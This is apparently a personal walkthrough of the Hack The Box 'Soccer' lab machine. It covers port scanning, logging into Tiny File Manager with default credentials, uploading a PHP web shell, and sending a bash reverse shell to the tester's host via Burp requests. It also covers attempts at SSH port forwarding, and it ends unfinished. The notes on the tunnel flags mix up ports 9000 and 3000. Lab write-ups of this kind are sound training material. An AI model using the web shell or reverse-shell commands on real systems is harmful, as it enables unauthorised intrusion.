```
sudo nmap -sS -sC -sV -p- 10.10.11.194
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 20:20 EDT
Nmap scan report for 10.10.11.194
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 18 Sep 2025 00:21:32 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 18 Sep 2025 00:21:32 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.95%I=7%D=9/17%Time=68CB5086%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Thu,\x2018\x20Sep\x202025\x2000:21:32\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Thu,\x2018\x20Sep\x202025\x2000:21:32\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Thu,\
SF:x2018\x20Sep\x202025\x2000:21:32\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
ill add soccer.htb to my etc/hosts file..

let check the website..:
![[Pasted image 20250922131255.png]]

```
gobuster dir -u http://soccer.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -x php,html,txt
```
```
/.git/logs/.html      (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.htaccess.html       (Status: 403) [Size: 162]
/.hta.html            (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.hta.txt             (Status: 403) [Size: 162]
/.htaccess.txt        (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.htpasswd.html       (Status: 403) [Size: 162]
/.htpasswd.txt        (Status: 403) [Size: 162]
/cgi-bin/.html        (Status: 403) [Size: 162]
/index.html           (Status: 200) [Size: 6917]
/index.html           (Status: 200) [Size: 6917]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

or:
```
feroxbuster -u http://soccer.htb
```
lets check out /tiny:
![[Pasted image 20250922131602.png]]

let me google this:
found this:
```
The default credentials for Tiny File Manager are

`admin` with the password `admin@123` and `user` with the password `12345`
```

and `admin:admin@123` work!

i find that i can upload file to /tiny/uploads.. with that said i also found during my google search this exploit which i am going to try now:
`https://fluidattacks.com/advisories/mosey`
```
<?php
 if($_POST && $_POST['password']==="admin@123") {
 echo system($_POST['cmd']);
 }
?>
```

i successfully upload and if i go to url i dont get 404 or anything:
![[Pasted image 20250922132330.png]]

now lets send this req to burpsuite and use a POST req:
```
POST /tiny/uploads/exploit.php HTTP/1.1
Host: soccer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: filemanager=ttu6ihcuc60oe7sthnuvd6n3jl
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

password=admin@123&cmd=whoami
```
OR
![[Pasted image 20250922133406.png]]

as you can see we get back www-data, lets send a one liner rev-shell:
```
POST /tiny/uploads/exploit.php HTTP/1.1
Host: soccer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: filemanager=ttu6ihcuc60oe7sthnuvd6n3jl
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

password=admin@123&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.16/4444+0>%261'
```

not i used burpsuites url-encode-as-you-type! :D

```
nc -lnvp 4444         
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.194] 46154
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$   
```

great i am shelled in as www-data!

checking in /etc/nginx, i find a new hostname:
`soc-player.soccer.htb`

lets add to our etc/hosts and check it out...
![[Pasted image 20250922135958.png]]

looking closer at code:
```
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}
```

we may need to tunnel port 3000 to our kali via ssh....
```
ssh -N -R 3000:127.0.0.1:3000 -o ExitOnForwardFailure=yes -o ServerAliveInterval=60 wizardwalter@10.10.14.16
```
```
- `-R 9000:127.0.0.1:3000` — tells the remote (Kali) to bind port **9000** and forward it to target's `127.0.0.1:3000`.
    
- `-N` — no remote command, just tunnel.
    
- `-o ExitOnForwardFailure=yes` — fail if the forward can't be created.
    
- `-o ServerAliveInterval=60` — keep-alive so the connection doesn’t drop.
```

not to be confused with:
Local forward (run **from your Kali** to the target)

Use this when you can SSH from Kali into the target directly.

Command (run **on Kali**):

`ssh -N -L 3000:127.0.0.1:3000 wizardwalter@10.10.14.16`

make sure when tunneling from target to kali:
```
sudo systemctl enable --now ssh
```
then check its status is up:
```
sudo systemctl status ssh --no-pager
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; enabled; preset: disabled)
     Active: active (running) since Wed 2025-09-17 20:07:32 EDT; 4 days ago
 Invocation: e0a51eadabbe41cbbb4327a43960bf15
       Docs: man:sshd(8)
             man:sshd_config(5)
   Main PID: 892 (sshd)
      Tasks: 1 (limit: 19046)
     Memory: 5.6M (peak: 6.2M)
        CPU: 33ms
     CGroup: /system.slice/ssh.service
             └─892 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
```

i edited my:
```
/etc/ssh/sshd_config

to:
AllowTcpForwarding yes
GatewayPorts yes

then:
sudo systemctl restart ssh
```

and still connection is not working.... hmmm, it def is running on port 3000:
```
ss -tlnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         511                0.0.0.0:9091             0.0.0.0:*                                                                                       
LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*                                                                                       
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*                                                                                       
LISTEN    0         511                0.0.0.0:80               0.0.0.0:*        users:(("nginx",pid=1132,fd=6),("nginx",pid=1131,fd=6))                        
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                                                                                       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                                                                                       
LISTEN    0         511              127.0.0.1:3000             0.0.0.0:*                                                                                       
LISTEN    0         511                   [::]:80                  [::]:*        users:(("nginx",pid=1132,fd=7),("nginx",pid=1131,fd=7))                        
LISTEN    0         128                   [::]:22                  [::]:*          
```

...... I can not get the site to load.... i went thru hell and back enumerating this machine... i think something is up with my browser or something but i will return to this machine another time... 
I HAVE BEEN PWNED!